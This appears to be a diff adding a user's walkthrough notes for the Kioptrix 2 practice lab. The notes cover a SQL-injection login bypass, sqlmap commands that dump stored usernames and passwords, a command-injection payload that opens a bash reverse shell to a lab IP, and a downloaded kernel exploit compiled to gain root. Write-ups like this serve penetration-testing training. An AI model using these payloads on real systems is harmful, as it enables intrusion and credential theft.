@@ -1,0 +1,54 @@
+KIOPTRIX 2
+Apache Server
+Kioptrix is running Apache HTTPd 2.0.52 (CentOS)
+Options
+Version based exploit
+Exploit the web interface
+The machine is running SQL, exposed my nmap
+Login page is probably sql.
+Also probably vulnerable to sqli (its Kioptrix)
+Felt lazy, ran sqlmap a couple times
+Didn’t reveal anything
+Went back, tried a couple basic injects
+1’ or ‘1’ = ‘1 = user
+1’ or ‘1’ = ‘1 = password
+This worked :)
+Brought to a webpage with an option to ping (but no input box?)
+See below at form screenshot
+
+SQLMAP stuff
+Used exploit above but in sqlmap
+Turned on burp and grabbed the post data
+Passed to sqlmap
+sqlmap -u "http://192.168.249.131" --data "uname=admin&psw=%27or%271%27%3D%271&btnLogin=Login" --dbs
+Found database webapp
+sqlmap -u "http://192.168.249.131" --data "uname=admin&psw=%27or%271%27%3D%271&btnLogin=Login" --a
+Found current user: john@localhost
+Banner ‘4.1.22’
+Backend is mysql (duh)
+sqlmap -u "http://192.168.249.131" --data "uname=admin&psw=%27or%271%27%3D%271&btnLogin=Login" --schema
+Found table “users”
+Found columns “id” “password” and “username”
+Wahoo
+sqlmap -u "http://192.168.249.131" --data "uname=admin&psw=%27or%271%27%3D%271&btnLogin=Login" -D webapp -T uses --dump-all
+Found “id = 1, username = admin, password = 5afac8d85f”
+Found “id = 2, username = john, password = 66lajGGbla”
+Logged in with actual username and password lol
+Decided to use curl because actual webpage was being weird…
+curl -s http://192.168.249.131/index.php -d “uname=admin&psw=%27or%271%27%3D%271&btnLogin=Login"
+Voila, returned html with a submit button :)
+For whatever reason, curled html is different than html shown on firefox…
+Edited the html a bit, moved the input commands inside the <td align=center> attribute, and boom there it was, the beautiful submit form.
+Easy from here, this form passes input straight to terminal
+Reverse shell
+192.168.249.128; /bin/bash -i >& /dev/tcp/192.168.249.128/4444 0>&1
+Got a shell, not root yet
+User = apache
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)                                                                 	| linux_x86/local/9542.c
+Looks like a good lpe exploit
+Python -m SimpleHTTPServer 9000
+Download exploit using curl to /tmp directory
+Gcc -o exploit.c exploit
+./exploit
+id = root
+Wahoo i have root
